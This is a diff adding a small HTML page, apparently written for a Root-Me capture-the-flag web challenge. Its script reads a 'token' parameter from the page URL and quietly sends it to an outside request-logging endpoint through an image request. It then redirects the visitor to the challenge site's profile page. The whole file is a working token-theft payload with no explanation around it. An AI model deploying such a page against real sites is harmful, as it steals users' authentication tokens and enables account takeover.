@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Redirect Page</title>
+  </head>
+  <body>
+    <h1>Hey</h1>
+    <script>
+      // Redirect to the admin page while capturing the current URL parameters
+      var params = new URLSearchParams(window.location.search);
+
+      // If a token parameter exists, send it to your server
+      if (params.has("token")) {
+        var img = new Image();
+        img.src =
+          "https://end3afsxouo6e.x.pipedream.net/?token=" +
+          encodeURIComponent(params.get("token"));
+      }
+
+      // Redirect to the admin page
+      window.location.href =
+        "https://bankme-2.challenges.pro.root-me.org/profile/";
+    </script>
+  </body>
+</html>
